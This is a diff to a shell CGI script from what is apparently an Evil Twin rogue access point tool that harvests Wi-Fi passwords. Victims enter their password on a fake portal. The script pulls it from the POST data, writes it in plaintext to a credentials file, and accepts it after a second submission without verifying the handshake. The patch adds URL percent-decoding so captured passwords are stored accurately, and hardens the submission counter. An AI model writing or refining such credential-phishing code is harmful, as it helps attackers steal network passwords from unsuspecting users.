@@ -17,6 +17,38 @@ fi
 
 POST_DATA=$(dd ibs=1 obs=1 count="$len" 2>/dev/null) || POST_DATA=""
 
+# application/x-www-form-urlencoded: + → space, %XX → byte（与前端 encodeURIComponent 一致）
+_url_decode_pct() {
+	_s="$1"
+	_o=""
+	while [ -n "$_s" ]; do
+		case "$_s" in
+		*%[0-9A-Fa-f][0-9A-Fa-f]*)
+			_pre=$(printf '%s' "$_s" | sed 's/%.*//')
+			_rest=$(printf '%s' "$_s" | sed 's/^[^%]*%//')
+			_h=$(printf '%s' "$_rest" | cut -c1-2)
+			_tail=$(printf '%s' "$_rest" | cut -c3-)
+			case "$_h" in
+			[0-9A-Fa-f][0-9A-Fa-f]) ;;
+			*)
+				_o="$_o$_pre%$_rest"
+				break
+				;;
+			esac
+			_dec=$((0x$_h))
+			_chr=$(awk "BEGIN{printf \"%c\", $_dec}")
+			_o="$_o$_pre$_chr"
+			_s="$_tail"
+			;;
+		*)
+			_o="$_o$_s"
+			break
+			;;
+		esac
+	done
+	printf '%s' "$_o"
+}
+
 password=""
 if [ -x /usr/bin/lua ]; then
 	password=$(printf '%s' "$POST_DATA" | /usr/bin/lua -e '
@@ -29,6 +61,7 @@ io.write(p)
 ')
 else
 	password=$(printf '%s' "$POST_DATA" | sed -n 's/^.*password=\([^&]*\).*$/\1/p' | tr '+' ' ')
+	password=$(_url_decode_pct "$password")
 fi
 
 password=$(printf '%s' "$password" | tr -d '\r\n')
@@ -103,6 +136,8 @@ fi
 # No handshake file: record and accept after 2nd submission (not cryptographically verified)
 echo "$ts | $password | pending" >> "$CREDS_FILE"
 count=$(wc -l < "$CREDS_FILE" 2>/dev/null || echo 0)
+count=$(printf '%s' "$count" | tr -cd '0123456789')
+[ -z "$count" ] && count=0
 if [ "$count" -ge 2 ]; then
 	echo "unverified_ok" > "$ET_DIR/submit_state.txt"
 	logger -t arx-et "Evil Twin: accepted after retry (no handshake file — not cryptographically verified)"
